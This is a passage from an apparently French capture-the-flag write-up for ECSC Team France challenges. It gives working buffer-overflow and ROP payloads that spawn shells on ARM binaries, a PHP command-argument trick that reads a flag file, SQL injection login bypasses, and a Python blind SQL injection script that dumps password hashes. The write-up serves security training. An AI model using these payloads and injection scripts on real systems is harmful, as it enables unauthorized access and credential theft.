
# ECSC Write-up Team-France by kiwhacks 

# [+] Pwn
## Aarchibald
Tout d'abord, regardons de quel type est le fichier `aarchibald` fourni :
```
$ file aarchibald
aarchibald: ELF 64-bit LSB pie executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=d8483190f176c46874dd383c62e36ee970712b09, not stripped
```
N'ayant à ce moment là pas de device arm ni de qemu-arm, je me suis tourné vers l'analyse statique. Pour essayer d'avoir quelques idées du challenge avant de sortir mes beaux outils, j'ai essayé de lancer la commande `strings` sur le binaire et je tombe sur ces mots intéressants :

``` 
$ strings aarchibald
...
Please enter your password:
eCfSDFwEeAYDr
Welcome back!
Entering debug mode
/bin/dash
Sorry, that's not the correct password.
Bye.
...
```
On essaye de valider avec le mot de passe `eCfSDFwEeAYDr` : NOPE. Voyons plutôt avec `r2` ce qu'il se passe. 

```
[0x000008b0]> pdf@main
            ;-- $x:
/ (fcn) main 380
|   int main (int argc, char **argv, char **envp);
...
|	    0x00000ae0      020040f9       ldr x2, [x0]                ; [0x11060:4]=0 ; obj.len
|           0x00000ae4      00000090       adrp x0, 0
|           0x00000ae8      01c03091       add x1, x0, str.eCfSDFwEeAYDr ; 0xc30 ; "eCfSDFwEeAYDr"
|           0x00000aec      a0630091       add x0, x29, 0x18
|           0x00000af0      50ffff97       bl sym.imp.strncmp          ; int strncmp(const char *s1, const char *s2, size_t n)
|           0x00000af4      1f000071       cmp w0, 0
|       ,=< 0x00000af8      81020054       b.ne 0xb48
|       |   0x00000afc      00000090       adrp x0, 0
|       |   0x00000b00      00003191       add x0, x0, str.Welcome_back ; 0xc40 ; "Welcome back!"
|       |   0x00000b04      5fffff97       bl sym.imp.puts             ; int puts(const char *s)
|       |   0x00000b08      000080d2       movz x0, 0
|       |   0x00000b0c      61ffff97       bl sym.imp.fflush           ; int fflush(FILE *stream)
|       |   0x00000b10      a13f40b9       ldr w1, [arg_3ch]           ; [0x3c:4]=0x1c001d ; '<'
|       |   0x00000b14      60688a52       movz w0, 0x5343             ; 'CS'
|       |   0x00000b18      60a8a872       movk w0, 0x4543, lsl 16
|       |   0x00000b1c      3f00006b       cmp w1, w0
|      ,==< 0x00000b20      40020054       b.eq 0xb68
|      ||   0x00000b24      00000090       adrp x0, 0
|      ||   0x00000b28      00403191       add x0, x0, str.Entering_debug_mode ; 0xc50 ; "Entering debug mode"
|      ||   0x00000b2c      55ffff97       bl sym.imp.puts             ; int puts(const char *s)
|      ||   0x00000b30      000080d2       movz x0, 0
|      ||   0x00000b34      57ffff97       bl sym.imp.fflush           ; int fflush(FILE *stream)
|      ||   0x00000b38      00000090       adrp x0, 0
|      ||   0x00000b3c      00a03191       add x0, x0, str.bin_dash    ; 0xc68 ; "/bin/dash"
|      ||   0x00000b40      44ffff97       bl sym.imp.system           ; int system(const char *string)
|     ,===< 0x00000b44      09000014       b 0xb68
...
```
Hmmm... Cela mérite d'être ouvert avec `gdb`. Ca tombe bien, je viens de retrouver mon raspberry qui était au fond de mon sac ! Je met un breakpoint sur l'adresse d'appel de `strncmp`  ayant rentré en mot de passe celui trouvé auparavant `eCfSDFwEeAYDr` :
```
strncmp@plt (
   $x0 = 0x0000fffffffff4a8 → "SuPerpAsSworD",
   $x1 = 0x0000aaaaaaaaac30 → "eCfSDFwEeAYDr",
   $x2 = 0x000000000000000d
)
```
On voit que la chaine est différente. On réessaye avec `SuPerpAsSworD`  et on obtient le joli message "Welcome back!". Après plusieurs essais avec différents inputs, je me suis rendu compte que c'est la chaine de l'utilisateur qui subit un traitement et le résultat de ce traitement doit correspondre à `eCfSDFwEeAYDr`, ce qui est le cas de `SuPerpAsSworD`.

On teste sur le serveur :
```
$ echo SuPerpAsSworD | nc challenges.ecsc-teamfrance.fr 4005
Please enter your password:
Welcome back!
$
```
**Eeeeeh.. Where's the f*cking shell?**

En faisant un peu plus attention, j'ai vu qu'il y a un troisième paramètre donné à `strncmp` permettant de limiter la comparaison à une certaine taille. Cela veut donc dire que...
```  
$ echo SuPerpAsSworDAAAA | nc challenges.ecsc-teamfrance.fr 4005  
Please enter your password:  
Welcome back!  
$  
```
Intéressant ! Si on regarde également d'un peu plus près le code, on se rend compte que pour entrer dans le mode débug, une comparaison est faite entre deux nombres déclarés avec des valeurs identiques. Et s'il y avait un buffer overflow (BOF) ? 
```
$ echo SuPerpAsSworDAAAAAAAAAAAAAAAAAAAAAAAAAAA | nc challenges.ecsc-teamfrance.fr 4005
Please enter your password:
Welcome back!
Entering debug mode
ls
^C
```
Good! Par contre, pas de réponse du shell. Essayons de laisser le pipe ouvert avec cat :
```
$ (echo SuPerpAsSworDAAAAAAAAAAAAAAAAAAAAAAAAAAA; cat) | nc challenges.ecsc-teamfrance.fr 4005
Please enter your password:
Welcome back!
Entering debug mode
id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
ls
aarchibald
flag
run.sh
cat flag
ECSC{32fb7ccc57121703b0a9a401e269e774c561b2bc}
```
 
## Armory
Dans un premier temps, on regarde à quel type de fichier on a à faire.
```
$ file armory 
armory: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=aaa2d5ba6d3a6cf3958eb9073e673795c2f1e24e, not stripped
```
Un deuxième ARM. Regardons son main avec `r2` :
```
[0x000103fc]> pdf@main
/ (fcn) main 112
|   int main (int argc, char **argv, char **envp);
|           ; UNKNOWN XREF from entry0 (+0x34)
|           0x00010558      00482de9       push {fp, lr}
|           0x0001055c      04b08de2       add fp, sp, 4
|           0x00010560      40d04de2       sub sp, sp, 0x40            ; '@'
|           0x00010564      5c309fe5       ldr r3, [0x000105c8]        ; [0x105c8:4]=236
|           0x00010568      03308fe0       add r3, pc, r3              ; 0x1065c ; "Hello, what's your name?"
|           0x0001056c      0300a0e1       mov r0, r3                  ; 0x1065c ; "Hello, what's your name?"
|           0x00010570      8fffffeb       bl sym.imp.puts             ; int puts(const char *s)
|           0x00010574      0000a0e3       mov r0, 0
|           0x00010578      8affffeb       bl sym.imp.fflush           ; int fflush(FILE *stream)
|           0x0001057c      44304be2       sub r3, fp, 0x44
|           0x00010580      0310a0e1       mov r1, r3
|           0x00010584      40309fe5       ldr r3, [0x000105cc]        ; [0x105cc:4]=232
|           0x00010588      03308fe0       add r3, pc, r3              ; 0x10678 ; "%s"
|           0x0001058c      0300a0e1       mov r0, r3                  ; 0x10678 ; "%s"
|           0x00010590      93ffffeb       bl sym.imp.__isoc99_scanf   ; int scanf(const char *format)
|           0x00010594      44304be2       sub r3, fp, 0x44
|           0x00010598      0310a0e1       mov r1, r3
|           0x0001059c      2c309fe5       ldr r3, [0x000105d0]        ; [0x105d0:4]=212
|           0x000105a0      03308fe0       add r3, pc, r3              ; 0x1067c ; "Hello %s!\n"
|           0x000105a4      0300a0e1       mov r0, r3                  ; 0x1067c ; "Hello %s!\n"
|           0x000105a8      7bffffeb       bl sym.imp.printf           ; int printf(const char *format)
|           0x000105ac      0000a0e3       mov r0, 0
|           0x000105b0      7cffffeb       bl sym.imp.fflush           ; int fflush(FILE *stream)
|           0x000105b4      0030a0e3       mov r3, 0
|           0x000105b8      0300a0e1       mov r0, r3
|           0x000105bc      04d04be2       sub sp, fp, 4
|           0x000105c0      0048bde8       pop {fp, lr}
\           0x000105c4      1eff2fe1       bx lr
``` 
Pas de traitement particulier à part récupérer une entrée utilisateur, la stocker et la réafficher. Ca sent le buffer overflow ! Pendant qu'on est sur `r2`, on peut regarder s'il n'y a pas des fonctions intéressantes que l'on pourrait appeler.
```
[0x000103fc]> afl
0x000103fc    1 44           entry0
0x000103c0    1 12           sym.imp.__libc_start_main
0x00010438    1 28           sym.call_weak_fn
0x0001045c    1 36           sym.deregister_tm_clones
0x0001048c    1 44           sym.register_tm_clones
0x000104c4    3 40           entry.fini0
0x000104f0    4 52           entry.init0
0x0001063c    1 4            sym.__libc_csu_fini
0x00010640    1 12           sym._fini
0x000105d4    4 96           sym.__libc_csu_init
0x00010558    1 112          main
0x000103b4    1 12           sym.imp.puts
0x000103a8    1 12           sym.imp.fflush
0x000103e4    1 12           sym.imp.__isoc99_scanf
0x0001039c    1 12           sym.imp.printf
0x0001052c    1 40           sym.evil
0x000103cc    1 12           sym.imp.system
0x00010378    1 16           sym._init
0x000103f0    1 12           sym.imp.abort
[0x000103fc]> pdf@sym.evil
/ (fcn) sym.evil 40
|   sym.evil ();
|           0x0001052c      00482de9       push {fp, lr}
|           0x00010530      04b08de2       add fp, sp, 4
|           0x00010534      18309fe5       ldr r3, [0x00010554]        ; [0x10554:4]=272
|           0x00010538      03308fe0       add r3, pc, r3              ; 0x10650 ; "/bin/dash"
|           0x0001053c      0300a0e1       mov r0, r3                  ; 0x10650 ; "/bin/dash"
|           0x00010540      a1ffffeb       bl sym.imp.system           ; int system(const char *string)
|           0x00010544      0000a0e1       mov r0, r0                  ; 0x10650 ; "/bin/dash"
|           0x00010548      04d04be2       sub sp, fp, 4
|           0x0001054c      0048bde8       pop {fp, lr}
\           0x00010550      1eff2fe1       bx lr

```

Parfait ! Il ne reste plus qu'à faire en sorte d'appeler la fonction `sym.evil`, elle fait déjà le job pour nous !  Déjà, il faut vérifier qu'il y ai bien un buffer overflow à exploiter.
```
$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' | ./armory

Hello, what's your name?
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
Segmentation fault (core dumped)
```

Ca en a tout l'air :) N'ayant pas les outils préinstallés sur mon qemu-arm et par manque de courage de faire une conf réseau pour en installer, j'ai modifié la taille du payload à tâton en ajoutant à la fin l'adresse de la fonction `evil`, `0x0001052c` ce qui nous donne cet exploit :

```
$ (echo -e "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x2c\x05\x01\x00" | awk '{printf "%s\n", $1}'; cat) | nc challenges.ecsc-teamfrance.fr 4003
Hello, what's your name?
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,!
id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
ls
armory
flag
run.sh
cat flag
ECSC{05eb7a36ecf4d4ad82e959340439203f0316a311}
```
Bien évidemment, sur un challenge plus difficile je n'aurais pas testé toutes les possibilités pour tomber sur le bon résultat, j'aurais eu une approche plus méthodique, mais ici cela vallait le coup d'essayer !


## Hola Armigo ! - 500pts
### Etude du binaire
Comme à mon habitude :
```
$ file armigo 
armigo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=b38c90d1e109ed93d03e2b87a384f4911d2c6d4c, not stripped
```

Encore un ARM ! You-pi.  Essayons d'interroger le serveur pour voir quelle est l'interaction avec lui.
```
$ nc challenges.ecsc-teamfrance.fr 4004
Hello, what's your name?
asdf
Hello asdf!
$ nc challenges.ecsc-teamfrance.fr 4004
Hello, what's your name?
AAAAAAAAAAAA
Hello AAAAAAAAAAAA!
```
Okay, le programme nous dit bonjour, prend une input et nous la réaffiche avant de quitter. Et si on essaye avec beaucoup de données ? On se rend compte que le programme ne nous donne pas de réponse. On peut donc penser à une exploitation par buffer overflow. Voyons maintenant ce que `r2` en dit.
```
[0x00010370]> pdf@main
/ (fcn) main 128
|   int main (int argc, char **argv, char **envp);
|           ; arg char **envp @ r2
|           ; arg int32_t arg4 @ r3
|           ; UNKNOWN XREF from entry0 (+0x34)
|           0x00010500      00482de9       push {fp, lr}
|           0x00010504      04b08de2       add fp, sp, 4
|           0x00010508      40d04de2       sub sp, sp, 0x40            ; '@'
|           0x0001050c      6c209fe5       ldr r2, [0x00010580]        ; [0x10580:4]=0x88a64
|           0x00010510      02208fe0       add r2, pc, r2              ; 0x98f7c ; obj._GLOBAL_OFFSET_TABLE
|           0x00010514      68309fe5       ldr r3, sym._d_449          ; [0x10584:4]=24
|           0x00010518      033092e7       ldr r3, [r2, r3]            ; envp
|           0x0001051c      003093e5       ldr r3, [r3]                ; 0x99428 ; "x\x91\t" ; arg4
|           0x00010520      0010a0e3       mov r1, 0
|           0x00010524      0300a0e1       mov r0, r3
|           0x00010528      2c2500eb       bl sym.setbuf               ; void setbuf(FILE *stream, char *buf)
|           0x0001052c      54309fe5       ldr r3, aav.0x00062ed0      ; [0x10588:4]=0x62ed0 aav.0x00062ed0
|           0x00010530      03308fe0       add r3, pc, r3              ; 0x73408 ; "echo \"Hello, what's your name?\""
|           0x00010534      0300a0e1       mov r0, r3                  ; 0x73408 ; "echo \"Hello, what's your name?\""
|           0x00010538      e6ffffeb       bl sym.debug
|           0x0001053c      44304be2       sub r3, fp, 0x44
|           0x00010540      0310a0e1       mov r1, r3
|           0x00010544      40309fe5       ldr r3, aav.0x00062ed8      ; [0x1058c:4]=0x62ed8 aav.0x00062ed8
|           0x00010548      03308fe0       add r3, pc, r3
|           0x0001054c      0300a0e1       mov r0, r3
|           0x00010550      d71b00eb       bl sym.__isoc99_scanf       ; int scanf(const char *format)
|           0x00010554      44304be2       sub r3, fp, 0x44
|           0x00010558      0310a0e1       mov r1, r3
|           0x0001055c      2c309fe5       ldr r3, aav.0x00062ec4      ; [0x10590:4]=0x62ec4 aav.0x00062ec4
|           0x00010560      03308fe0       add r3, pc, r3              ; 0x7342c ; "Hello %s!\n"
|           0x00010564      0300a0e1       mov r0, r3                  ; 0x7342c ; "Hello %s!\n"
|           0x00010568      b61b00eb       bl sym.__printf
|           0x0001056c      0030a0e3       mov r3, 0
|           0x00010570      0300a0e1       mov r0, r3
|           0x00010574      04d04be2       sub sp, fp, 4
|           0x00010578      0048bde8       pop {fp, lr}
\           0x0001057c      1eff2fe1       bx lr
[0x00010370]>
```
On retrouve 4 fonctions appelées depuis le main à laquelle on peut attribuer assez facilement un rôle :
 - sym.setbuf : préparer l'input de l'utilisateur
 - sym.debug : afficher des données de débug (ou non :))
 - sym.__isoc99_scanf : récupérer l'entrée utilisateur
 - sym.__printf : afficher `Hello %s!` avec la chaine entrée par l'utilisateur

La fonction sur laquelle nous allons naturellement nous pencher à donc `sym.debug`.

```
/ (fcn) sym.debug 40
|   sym.debug ();
|           ; var int32_t var_8h @ fp-0x8
|           ; CALL XREF from main (0x10538)
|           0x000104d8      00482de9       push {fp, lr}
|           0x000104dc      04b08de2       add fp, sp, 4
|           0x000104e0      08d04de2       sub sp, sp, 8
|           0x000104e4      08000be5       str r0, [var_8h]            ; sym._nl_current_LC_MONETARY
|           0x000104e8      08001be5       ldr r0, [var_8h]            ; sym._nl_current_LC_MONETARY
|           0x000104ec      341b00eb       bl sym.system               ; int system(const char *string)
|           0x000104f0      0000a0e1       mov r0, r0
|           0x000104f4      04d04be2       sub sp, fp, 4
|           0x000104f8      0048bde8       pop {fp, lr}
\           0x000104fc      1eff2fe1       bx lr
```

On peut voir que cette fonction fait elle même appel à la fonction `sym.system`. On peut cependant voir (toujours dans `r2`) que cette fonction n'est pas celle de la `libc`, mais une fonction codée en interne. Elle fait encore une fois appel à une autre fonction `sym.do_system`. Cette dernière est beaucoup plus longue et s'occupe de faire plein de choses que je ne me suis pas donné la peine de reverse, puisque j'ai directement remarqué l'appel à `execve` à la fin de la fonction. 
```
...
|           0x00017174      004085e5       str r4, [r5]
|           0x00017178      044085e5       str r4, [r5, 4]
|           0x0001717c      ef4300eb       bl sym.execve
|           0x00017180      7f00a0e3       mov r0, 0x7f
\           0x00017184      d04300eb       bl sym._Exit                ; void _Exit(int status)
```
Reste à savoir pourquoi il y a un appel à cette fonction à cet endroit du code.

Je reprend mon raspberry pour passer au debug dynamique à l'aide du délicieux `gdb/gef`. En mettant un breakpoint à l'appel de `debug()` dans le `main` pour voir quels sont les paramètres passés, on comprend tout de suite à quoi sert l'appel à `execve()` :
```
debug (
   $r0 = 0x00073408 → "echo "Hello, what's your name?"",
   $r1 = 0x00000000,
   $r2 = 0x0009a488 → 0x00000000,
   $r3 = 0x00073408 → "echo "Hello, what's your name?""
)
```
L'affichage du message de bienvenue se fait donc comme ceci :
`execve("echo \"Hello, what's your name?\"");`. 

Autre confirmation : 
```
$ python -c "print 'A'*500" | ./armigo 
Hello, what's your name?
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
[1]    6502 done                python -c "print 'A'*500" | 
       6503 segmentation fault  ./armigo
```
Nous avons bien à faire à un BOF. Dernier point :
```
$ readelf -l ./armigo
...
  TLS            0x078ee8 0x00098ee8 0x00098ee8 0x00010 0x00028 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  GNU_RELRO      0x078ee8 0x00098ee8 0x00098ee8 0x00118 0x00118 R   0x1
...
```
La stack n'est pas executable.

**Pour résumer :**

 - Un buffer overflow à exploiter avec input à donner manuellement au binaire
 - Un appel à `execve`
 - Pile non executable : pas de shellcode à mettre directement dans la pile

### Idée de l'exploitation
Étant donné que la pile n'est pas executable, je me suis penché vers un exploit en *ROP* (Return Oriented Programming). L'idée est la suivante. 

 - Maitriser le BOF
 - Faire en sorte d'avoir `'/bin/sh'` au dessus de la pile
 -  Appeler `execeve()` déjà présente dans le binaire 
 - Obtenir un shell
 - Obtenir le flag :)

### Exploit
J'utilise `python2` afin de créer mon payload et le transmettre par la suite au binaire. Pour faciliter le debug je suis passé via un fichier intermédiaire. 

La première étape consiste à trouver à partir de quel moment nous serions en mesure de pouvoir contrôler `$lr`, le registre pointant vers l'instruction après l'appel à `return`. Après quelques essais, j'ai pu obtenir ce début de payload :
```
gef➤  r < /tmp/qq
Starting program: /root/armigo < /tmp/qq
Hello, what's your name?
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADCBABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB!

Program received signal SIGSEGV, Segmentation fault.
0x41424344 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0x0       
$r1  : 0x0       
$r2  : 0x0009a488  →  0x00000000
$r3  : 0x0       
$r4  : 0xfffef5f8  →  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
$r5  : 0x0       
$r6  : 0x00010ce8  →  <__libc_csu_init+0> push {r4,  r5,  r6,  r7,  r8,  r9,  r10,  lr}
$r7  : 0x0       
$r8  : 0x0       
$r9  : 0x0       
$r10 : 0x0       
$r11 : 0x41414141 ("AAAA"?)
$r12 : 0x0       
$sp  : 0xfffef5e8  →  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
$lr  : 0x41424344 ("DCBA"?)
$pc  : 0x41424344 ("DCBA"?)
$cpsr: [thumb fast interrupt overflow CARRY ZERO negative]
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xfffef5e8│+0x0000: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"	 ← $sp
0xfffef5ec│+0x0004: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
0xfffef5f0│+0x0008: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
0xfffef5f4│+0x000c: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
0xfffef5f8│+0x0010: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"	 ← $r4
0xfffef5fc│+0x0014: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
0xfffef600│+0x0018: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
0xfffef604│+0x001c: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
────────────────────────────────────────────────────────────────────────────────────── code:arm:ARM ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41424344
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "armigo", stopped, reason: SIGSEGV
```

On a un padding de 68 caractères pour dépasser le tampon, les 4 octets suivants vont réécrire le registre `$lr`, une partie de ceux d'après seront stockés dans `$r4`. Très bien ! 
La prochaine étape est de trouver un gadget nous permettant de mettre notre payload stocké initialement dans `$r4` dans le registre `$r0`, celui stockant le premier argument lors d'un appel à une fonction. En effet, il nous faudra appeler `execve()` avec les mêmes arguments que cités précédemment pour l'appel à `system()`, à la différence que quatrième nous sera inutile. Par chance, `$r1` et `$r2` ont déjà les bonnes valeurs.

On resort `r2` et on tombe sur un gadget qui semblerait faire le job avec nos contraintes :
```
  0x00061bec           0400a0e1  mov r0, r4
  0x00061bf0           18d08de2  add sp, sp, 0x18
  0x00061bf4           1040bde8  pop {r4, lr}
  0x00061bf8           1eff2fe1  bx lr
```
On a tout ! C'est parti, on compose notre payload final.

   - `'A'*68` : padding pour exploiter le BOF
   - `\xec\x1b\x06\x00` : adresse de notre gadget
   - `'B'*16` : padding pour la suite de l'execution du programme (instructions `pop`)
   - `/bin/sh\x00` : commande à faire passer à `execve()`
   - `C*4` : padding once again
   - `\x7c\x71\x01\x00` : adresse de l'appel à `execve()`

Essayons l'exploit sur le challenge en ligne...
```
# root @ arm in ~ 
$ python2 -c "print 'A'*64 + 'D'*4 + '\xec\x1b\x06\x00' + 'C'*16 + '/bin/sh\x00' + 'Z'*4 + '\x7c\x71\x01\x00' " > /tmp/asd

# root @ arm in ~ 
$ (cat /tmp/asd; cat) | nc challenges.ecsc-teamfrance.fr 4004
Hello, what's your name?
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDDD�
d
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
ls
armigo
flag
run.sh
cat flag
ECSC{83f0ffc67a36bb6573e8c466e22b672e678df3bf}
^C
```
Bingo ! :D
Ce n'était au final qu'un exploit ROP relativement simple, puisqu'il n'y avait qu'un seul gadget à utiliser. C'était tout de même très fun !


# [+] Web
## PHP Sandbox
On commence par ouvrir la page du challenge avec un navigateur et on obtient le doux message suivant : **`Command arguments not found!`**. Ooooookay.
Après quelques essais, je test une requête `GET` sur `/?args=asd` et j'obtiens un nouveau message d'erreur : **`Only 'cat &lt;file&gt;' command allowed`**.

Il faut alors comprendre qu'il est possible de mettre `args` en tableau et de passer plusieurs "mots" pour construire une commande. J'ai alors testé `/?args[0]=cat&args[1]=*`. Il y a visiblement un filtre sur `*` : **`preg_match() has just detected invalid characters! ¯\_(ツ)_/¯`**. 

J'ai donc déjà récupéré le contenu de `index.php` avec `/?args[0]=cat&args[1]=index.php` ou il y avait comme indice en commentaire dans le code, chiffré base 64 (`L2hvbWUvZmxhZy50eHQ=`) ayant pour valeur `/home/flag.txt`. 

`GET /?args[0]=cat&args[1]=/home/flag.txt` nous donne le flag : `ECSC{ae822cf59d26401b64f20ee9af8fd4cf31da79ab}`.

## Scully (1)
J'arrive donc sur la page du challenge, s'offre à moi un formulaire avec un login et un mot de passe. Première chose qui me vient à l'esprit : attaque par injection SQL. Mon premier test que je ressors à toutes les occasions ? username : `admin'--` et du random en password. 
Résultat :
`Successful Login. Here is your flag: ECSC{889b71de2017ca8074f49d3f853950e147591b38}`

Well... done? One shot!

## Scully (2)
C'est reparti pour un tour, de nouveau ce formulaire de connexion. On se refait la classique username `admin'--` et du random en password : `**Successful Login**`. Wait... What?!

Fausse frayeur, pas plus d'informations que ce message. Je teste avec plusieurs input et je me rend vite compte des deux messages possibles :
 - Login Failed
 - Successful Login

On a donc ici à faire à une ***blind SQL injection***. 

![](https://i.ytimg.com/vi/t0p2LGjWH5g/hqdefault.jpg)





J'avais donc déjà trouvé un utilisateur de la base, `admin`. Au début, l'objectif était donc clair, obtenir son mot de passe. J'ai donc fait un petit script python qui va injecter dans le champ admin la chaine suivante (on ne précisera jamais ce qu'il y a dans le champ password puisque celui sera ignoré par les `--` à la fin de l'injection) :
`admin' and substr(password, $n$, 1)='$c$'--` avec `$n$` l'indice du caractère dans le mot de passe que l'on cherche à obtenir et `$c$` le caractère. En d'autre terme, cela correspond à se demander si le `n`ème caractère du mot de passe est `c`, si oui on cherche le caractère `n+1`.

Je suis parti du principe que le password était en hexadécimal. En injectant avec la requête `admin' and length(password) > $n$--`, j'ai rapidement trouvé la longueur du password comme étant 64. 
64 octets... héxadécimal... sha256 ? 

```
import requests
import re
import time
import json

cookies=dict(session='ce713354-36c2-4701-af69-3a19bd338307')

length = 64
found = 0
l = 1
c = [48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102]
i = 0
final_pass=""

while(!found):
        time.sleep(0.1) # je pense à vous :)
        login="admin' and substr(password,"+str(l)+",1"+")='"+str(chr(c[i]))+"'-- "
        r={"username":login,"password":"asd"}
        result=r.post('http://challenges.ecsc-teamfrance.fr:8004/api/v1/login/', cookies=cookies, headers={"Accept-Language":"en", "Content-Type": "application/json"}, data=json.dumps(r)).content
        res=re.search("success",result)
        if res is not None:
                print r
                if (length!=l):
                        final_pass+=chr(c[i])
                        l+=1
                        i = 0 
                else:
                        final_pass+=chr(c[i])
                        found=1
        else:
                i+=1

print ("Flag: %s " % final_pass)
```
On obtient : `Flag: 6d4d6c784b7c2870c721f18a6e83305260679076ddd6ed79530ef3b4edb29740`
Yes! Je vérifie sur la page de login, ca fonctionne. Je tente de valider avec ECSC{flag}... fail. 
Je tente donc une recherche du hash sur internet... nada. 

AH.

Je modifie légèrement mon script pour vérifier s'il n'y a pas d'autres users, et il se trouve que si. 
En remplacant dans le script python le login par `login="asd' or substr(username,"+str(length)+",1"+")='"+str(chr(i))+"'-- "` (et quelques petites adaptations pendant le déroulement du script que je me passerai de détailler ici), j'ai pu dumper tous les users et par la suite leur mot de passe, ainsi que leur clairs. On a donc :
```
user:sha256(password):clair

admin:6d4d6c784b7c2870c721f18a6e83305260679076ddd6ed79530ef3b4edb29740:?
r.alexander:1c8bfe8f801d79745c4631d09fff36c82aa37fc4cce4fc946683d7b336b63032:letmein
m.benson:90ecc336d6200b1389eb49c4b557ee42892345c2f727453ae82c96e6de94098e:P@$$w0rd
m.poole:3693d93220b28a03d3c70bdc1cab2b890c65a2e6baff3d4a2a651b713c161c5c:badpassword
```

Encore une fois, aucun flag ne valide. S'il y a d'autres users, il y a peut-être d'autres tables ?
Je remodifie la requête pour regarder s'il y a d'autres tables et je tombe assez rapidement sur la table `flag` contenant le champ `flag`. Let's dump again!
`login="asd' union select 1,2,flag from flag where substr(flag,"+str(length)+", 1"+")='"+str(chr(i))+"'-- "`

Cette fois-ci, l'exploit est légèrement plus complèxe,  puisqu'avec `union` il faut faire attention que le nombre de colonnes sélectionnées soit le même que pour le début de la requête. On peut donc maintenant en déduire que la requête originale est `SELECT id, username, password from table_des_users where username = ' + input + ' and password = ' + input + '`. Ca n'est pas utile, mais c'est toujours sympa de le noter.

Après quelques secondes/minutes on obtient le précieux :)
`ECSC{3f65e0e1d453f6c8a79a90131aef13326a9a0bea}`

## Jack The Ripper
### Présentation
Dans ce challenge nous avons accès à 3 sources :

 - `index.php` : formulaire de login et script d'authentification
 - `user.class.php` : code de la classe user
 - `core.class.php` : code de vérification du login (avec SQL)

Je vais commenter directement dans le code les éléments qui me paraissent source d'erreurs et donc qui pourront être intéressant *a fortiori*.

```
index.php

<?php 
require 'user.class.php';  
 
// Restore session  
if(isset($_COOKIE['user'])) $u = unserialize($_COOKIE['user']);  // control direct de l'utilisateur de l'objet $u via le cookie, peu import la valeur
else $u = new User();  // l'objet est réinit que s'il n'existe pas... donc jamais
  
// A new login?  
if(isset($_POST['login'], $_POST['password'])) {    // on passe la condition avec ou sans $u
